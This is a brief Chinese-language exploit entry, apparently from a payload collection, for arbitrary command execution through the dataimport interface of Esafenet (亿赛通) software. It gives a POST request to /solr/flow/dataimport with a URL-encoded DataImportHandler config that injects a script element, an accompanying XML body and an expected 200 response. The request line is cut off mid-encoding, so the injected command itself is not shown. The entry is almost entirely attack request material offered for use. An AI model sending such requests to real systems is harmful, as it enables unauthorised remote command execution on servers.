# 亿赛通dataimport接口任意命令执行

- **系统**：亿赛通dataimport接口任意　|　**类型**：命令执行　|　**CVE**：—
- **请求**：`POST /solr/flow/dataimport?command=full-import&verbose=false&clean=false&commit=false&debug=true&core=tika&name=dataimport&dataConfig=%0A%3CdataConfig%3E%0A%3CdataSource%20name%3D%22streamsrc%22%20type%3D%22ContentStreamDataSource%22%20loggerLevel%3D%22TRACE%22%20%2F%3E%0A%0A%20%20%3Cscript%3E%3C!%5`

**请求体 / payload**
```
<?xml version="1.0" encoding="UTF-8"?>
<RDF>
<item/>
</RDF>
```
- **预期**：200　|　IPv6